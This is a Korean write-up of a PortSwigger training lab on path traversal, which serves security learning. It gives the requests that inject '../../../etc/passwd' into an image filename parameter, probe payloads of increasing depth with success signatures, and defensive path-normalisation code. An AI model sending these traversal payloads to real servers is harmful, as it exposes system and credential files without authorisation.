# Lab: File path traversal, simple case

## 개요

- **난이도**: Apprentice
- **주제**: Path Traversal — `../` 를 이용한 임의 파일 읽기 / 상품 이미지 표시 기능
- **링크**: https://portswigger.net/web-security/file-path-traversal/lab-simple

## 목표

상품 이미지를 표시하는 기능의 `filename` 파라미터에 경로 순회 시퀀스를 주입해 서버의 `/etc/passwd` 파일 내용을 읽어온다.

## Path Traversal 기초 개념

### Path Traversal 이란

```
[정상 동작]
  사용자가 상품 이미지를 요청
  GET /image?filename=21.jpg
       ↓
  서버: readfile("/var/www/images/" + "21.jpg")
       ↓
  /var/www/images/21.jpg 반환

[취약한 동작]
  filename 에 ../ 를 넣어 기준 디렉토리를 탈출
  GET /image?filename=../../../etc/passwd
       ↓
  서버: readfile("/var/www/images/" + "../../../etc/passwd")
       ↓
  경로 정규화 → /etc/passwd 반환
```

`../` 는 "상위 디렉토리로 이동" 을 의미한다. 입력이 파일 경로에 그대로 결합될 때
상위로 탈출해 애플리케이션 디렉토리 밖의 파일을 읽을 수 있다.

### 디렉토리 깊이 계산

```
기준 디렉토리: /var/www/images/
  ..  →  /var/www/
  ../..  →  /var/
  ../../..  →  /
  ../../../etc/passwd  →  /etc/passwd

즉, 기준 디렉토리 깊이만큼 ../ 를 올라가면 루트에 도달한다.
필요한 ../ 개수는 서버 환경에 따라 다르므로
1, 2, 3, 4 ... 순으로 늘려가며 확인해야 한다.
```

### 절대 경로도 가능

```
GET /image?filename=/etc/passwd
```

필터가 없으면 절대 경로를 그대로 넣는 것만으로도 성공할 수 있다.
(단, 이번 랩처럼 앞에 기준 경로가 붙는 구조에서는 `../` 가 필요)

## 취약 지점

```
GET /image?filename=21.jpg HTTP/1.1
              ↑
       파일 경로에 그대로 결합되는 파라미터
```

서버 내부 처리 (추정):

```php
$filename = $_GET['filename'];
readfile("/var/www/images/" . $filename);
```

사용자 입력에 대한 검증이 전혀 없어 `../` 시퀀스가 그대로 경로에 반영된다.

## 공격 단계

### 1단계 — 이미지 요청 캡처

상품 페이지에서 이미지를 불러오는 요청을 Burp Suite 로 가로챈다.

```http
GET /image?filename=21.jpg HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### 2단계 — filename 파라미터 변조

`filename` 값을 `../../../etc/passwd` 로 교체한다.

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### 3단계 — 응답 확인

`/etc/passwd` 내용이 그대로 반환되면 랩 해결.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## ../ 깊이 검증의 필요성 (툴 필요성)

기준 디렉토리 깊이를 모르는 상태에서는 성공하는 `../` 개수를 알 수 없다.
따라서 다음을 반복 검증할 필요가 있다.

```
filename=../etc/passwd
filename=../../etc/passwd
filename=../../../etc/passwd
filename=../../../../etc/passwd
filename=../../../../../etc/passwd
...
```

성공 여부 판별 기준:

```
응답에 "root:x:0:0" 포함 여부
또는 Content-Type 이 image/* 가 아닌 text/plain 등으로 바뀌는지
```

이 반복을 수동으로 하면 비효율적이므로, 깊이를 1씩 늘리며 요청을 보내고
`/etc/passwd` 시그니처가 나타나는 깊이를 자동 탐지하는 스크립트가 유용하다.
(→ `tools/12-path-traversal-scan.py`)

## 방어

```
[근본 해결]
  사용자 입력으로 파일 경로를 직접 만들지 않는다.
  → 파일명을 ID 로 매핑하거나 화이트리스트 목록으로 관리

[불가피하게 경로를 받을 때]
  1. 경로 정규화 후 기준 디렉토리 내부인지 검증
     import os
     base = os.path.realpath("/var/www/images")
     target = os.path.realpath(os.path.join(base, user_input))
     if not target.startswith(base + os.sep):
         raise ValueError("허용되지 않은 경로")

  2. 파일명만 허용 (디렉토리 구분자 제거)
     filename = os.path.basename(user_input)

[절대 피해야 할 것]
  단순히 "../" 문자열만 치환/차단 → 인코딩, 중첩 시퀀스로 우회 가능
```

## 핵심 정리

- 상품 이미지 `filename` 파라미터에 `../../../etc/passwd` 를 넣어 서버의 임의 파일을 읽었다.
- `../` 는 기준 디렉토리의 상위로 이동하는 시퀀스이며, 기준 깊이만큼 올라가면 루트에 도달한다.
- 필요한 `../` 개수는 환경마다 다르므로 1부터 늘려가며 응답을 검증해야 하며, 이 반복은 자동화 가치가 있다.
- 근본 방어는 경로 정규화 후 기준 디렉토리 내부인지 확인하거나, 파일명만 사용하도록 제한하는 것이다.

## 배운 점

- `../` 만으로 성공하는 기본 케이스지만, "몇 단계 올라가야 하는가" 를 찾는 과정이 핵심이며 이를 자동화하는 툴의 필요성을 확인했다.
- 후속 랩에서는 `../` 가 차단/치환되거나 시작 경로/확장자 검증이 추가되므로, 이번 랩은 우회 기법을 얹을 기준선(baseline)이 된다.
